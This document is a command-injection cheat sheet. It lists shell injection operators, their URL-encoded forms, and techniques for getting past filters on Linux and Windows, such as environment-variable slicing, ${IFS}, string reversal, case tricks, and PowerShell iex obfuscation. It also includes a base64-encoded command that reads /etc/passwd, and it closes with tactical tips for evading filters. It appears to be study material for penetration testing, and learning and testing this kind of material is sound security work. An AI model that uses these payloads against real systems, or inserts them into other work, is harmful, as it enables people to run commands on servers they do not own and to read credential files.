# Command Injection

Goal: Execute OS commands through vulnerable input fields.

---

# Injection Operators

;  
\n  
&  
|  
&&  
||  
``  
$()

---

# URL Encoded Operators

%3b
%0a
%26
%7c
%26%26
%7c%7c
%60%60
%24%28%29

---

# Linux – Filtered Character Bypass

printenv

%09

${IFS}

{ls,-la}

${PATH:0:1}

${LS_COLORS:10:1}

$(tr '!-}' '"-~'<<<[)

---

# Blacklisted Command Bypass (Linux)

'  
"  
$@  
\  

$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

$(a="WhOaMi";printf %s "${a,,}")

echo 'whoami' | rev

$(rev<<<'imaohw')

echo -n 'cat /etc/passwd | grep 33' | base64

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

---

# Windows – Filtered Character Bypass

Get-ChildItem Env:

%09

%PROGRAMFILES:~10,-5%

$env:PROGRAMFILES[10]

%HOMEPATH:~0,-17%

$env:HOMEPATH[0]

---

# Windows Command Obfuscation

WhoAmi

"whoami"[-1..-20] -join ''

iex "$('imaohw'[-1..-20] -join '')"

[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

---

# Tactical Notes

- Try basic operators first.
- If filtered → use encoding or variable slicing.
- Base64 execution is powerful.
- On Windows, PowerShell obfuscation often bypasses filters.
